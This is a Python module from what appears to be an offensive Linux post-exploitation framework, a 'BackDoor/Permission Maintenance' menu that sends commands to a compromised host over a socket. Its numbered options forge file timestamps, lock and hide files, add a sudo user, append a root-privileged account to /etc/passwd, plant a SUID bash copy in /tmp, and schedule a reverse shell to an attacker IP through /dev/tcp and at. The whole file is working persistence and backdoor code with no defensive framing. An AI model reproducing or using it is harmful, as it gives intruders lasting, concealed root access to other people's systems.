import os
import sys
import struct
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit.history import InMemoryHistory

sys.path.append(os.path.dirname(os.path.realpath(__file__)))
from AuxiliaryFunctions import MyTable


class PermissionMaintenance:
    def __init__(self, conn):
        commands = ["back", "show params", "show functions"]
        completer = WordCompleter(commands)
        formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Destroy Linux)-\033[0m\033[1;31;31m[BackDoor/Permission Maintenance] \033[0m')
        history = InMemoryHistory()
        while True:
            try:
                choice = prompt(formatted_text1, completer=completer, history=history)
                if choice.lower() == 'show functions':
                    self.show_functions()
                    continue
                elif choice == 'show params':
                    self.show_params()
                    continue
                elif choice == "":
                    continue
                elif choice == 'back':
                    break
                elif choice.split()[0] == '1':
                    command = "touch -r {} {}".format(choice.split()[1], choice.split()[2])
                    self.receive(conn, command)
                    continue
                elif choice.split()[0] == '2':
                    command = "chattr +i {}".format(choice.split()[1])
                    self.receive(conn, command)
                    continue
                elif choice.split()[0] == '3':
                    command = "mv {} .{}".format(choice.split()[1], choice.split()[1])
                    self.receive(conn, command)
                    continue
                elif choice.split()[0] == '4':
                    print('\033[1;32;32m' + "[+] 创建用户{}:".format(choice.split()[1]) + '\033[0m')
                    command = "useradd -m {}".format(choice.split()[1])
                    self.receive(conn, command)
                    print('\033[1;32;32m' + "[+] 设置用户{}的密码:".format(choice.split()[1]) + '\033[0m')
                    command = "echo '{}:{}' | sudo chpasswd".format(choice.split()[1], choice.split()[2])
                    self.receive(conn, command)
                    print('\033[1;32;32m' + "[+] 赋予用户{} sudo权限:".format(choice.split()[1]) + '\033[0m')
                    command = "usermod -aG sudo {}".format(choice.split()[1])
                    self.receive(conn, command)
                    continue
                elif choice.split()[0] == '5':
                    print('\033[1;32;32m' + "[+] 生成密文密码：" + '\033[0m')
                    command = "perl -le 'print crypt(\"{}\",\"{}\")'".format(choice.split()[2], choice.split()[3])
                    print("加密后的密码:")
                    self.receive(conn, command)
                    passwd_salt = input("输入加密后的密码 > ")
                    command = "echo \"{}:{}:{}:/root:/bin/bash\" >> /etc/passwd".format(choice.split()[1], passwd_salt, choice.split()[4])
                    self.receive(conn, command)
                    print('\033[1;32;32m' + "[+] 查看/etc/passwd文件中的{}用户：".format(choice.split()[1]) + '\033[0m')
                    command = "cat /etc/passwd | grep {}".format(choice.split()[1])
                    self.receive(conn, command)
                elif choice == '6':
                    print('\033[1;32;32m' + "[+] 复制bash文件到/tmp目录下，并重命名为shell：" + '\033[0m')
                    command = "cp /bin/bash /tmp/shell"
                    self.receive(conn, command)
                    print('\033[1;32;32m' + "[+] 设置/tmp目录下的shell文件的SetUID权限：" + '\033[0m')
                    command = "chmod u+s /tmp/shell"
                    self.receive(conn, command)
                    print("如果上述两个操作均正常执行，那么普通用户便可通过执行\"/tmp/shell -p\"命令来把身份切换到root.")
                elif choice.split()[0] == '7':
                    print('\033[1;32;32m' + "[+] 创建反弹后门shell.sh，其中攻击者IP为{}，监听的端口号为{}：".format(choice.split()[6], choice.split()[7]) + '\033[0m')
                    command = "echo '#!/bin/bash' > /shell.sh"
                    self.receive(conn, command)
                    command2 = "echo 'bash -i >& /dev/tcp/{}/{} 0>&1' >> /etc/shell.sh".format(choice.split()[6], choice.split()[7])
                    self.receive(conn, command2)
                    command3 = "chmod +sx /etc/shell.sh"
                    self.receive(conn, command3)
                    print("[+] 创建的反弹shell后门文件/etc/shell.sh如下：")
                    command4 = "cat /etc/shell.sh"
                    self.receive(conn, command4)
                    print('\033[1;32;32m' + "[+] 创建定时任务，该计划定时任务为在{}/{}/{} {}:{}执行反弹shell文件/etc/shell.sh：".format(choice.split()[5], choice.split()[4], choice.split()[3], choice.split()[2], choice.split()[1]) + '\033[0m')
                    command5 = "echo '/etc/shell.sh' | at {}:{} {}/{}/{}".format(choice.split()[2], choice.split()[1], choice.split()[4], choice.split()[3], choice.split()[5])
                    self.receive(conn, command5)
            except:
                print('\033[1;31;31m' + "[-] something wrong!" + '\033[0m')
                continue

    def receive(self, conn, command):
        conn.sendall(command.encode("utf-8"))
        result_len = conn.recv(4)
        real_len = struct.unpack("i", result_len)[0]
        while True:
            if 1024 < real_len:
                result = conn.recv(1024).decode("utf-8", errors="ignore")
                print(result)
                real_len = real_len - 1024
                continue
            else:
                result = conn.recv(1024).decode("utf-8", errors="ignore")
                print(result)
                break

    def show_functions(self):
        print("\n" + '\033[1;34;34m' + "Permission Maintenance" + '\033[0m' + "\n" + '=' * len("Permission Maintenance") + "\n")
        headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model" + '\033[0m', '\033[1;34;34m' + "usage" + '\033[0m', '\033[1;34;34m' + "description" + '\033[0m']
        mydata = [["1", "Forgery Time", "1 reference target", "伪造目标文件的创建时间"],
                  ["2", "Lock File", "2 Lock_File", "锁定目标文件，使其无法被删除"],
                  ["3", "Hide target file", "3 hide_file", "隐藏目标文件"],
                  ["4", "Create a user with sudo permissions", "4 username password", "创建具有sudo权限的用户"],
                  ["5", "Add root user to the/etc/passwd file", "5 username password salt usergroup", "往/etc/passwd文件添加root用户"],
                  ["6", "suid shell", "6", "使普通用户变为root"],
                  ["7", "Scheduled Tasks", "7 min hour day month year attacker_ip port", "创建反弹shell的计划定时任务，让该反弹shell文件在规定时间执行"]]
        MyTable.createTable(headers, mydata)

    def show_params(self):
        print("\n" + '\033[1;34;34m' + "Parameter Description" + '\033[0m' + "\n" + '=' * len("Parameter Description") + "\n")
        headers = ['\033[1;34;34m' "Params" + '\033[0m', '\033[1;34;34m' "Description" + '\033[0m']
        mydata = [["reference", "目标时间戳的文件，要求输入绝对路径，如/root/Desktop/1.txt"],
                  ["target", "要修改时间戳的目标文件，要求输入绝对路径，如/root/Desktop/2.txt"],
                  ["Lock_File", "需要锁定的目标文件，要求输入绝对路径，如/root/Desktop/3.txt"],
                  ["hide_file", "需要隐藏的目标文件，要求输入绝对路径，如/root/Desktop/4.txt"],
                  ["username", "用户名"],
                  ["password", "用户密码"],
                  ["salt", "盐值"],
                  ["usergroup", "用户组"],
                  ["min", "分钟"],
                  ["hour", "小时"],
                  ["day", "日"],
                  ["month", "月"],
                  ["year", "年"],
                  ["attacker_ip", "攻击者IP"],
                  ["port", "监听端口"]]
        MyTable.createTable(headers, mydata)
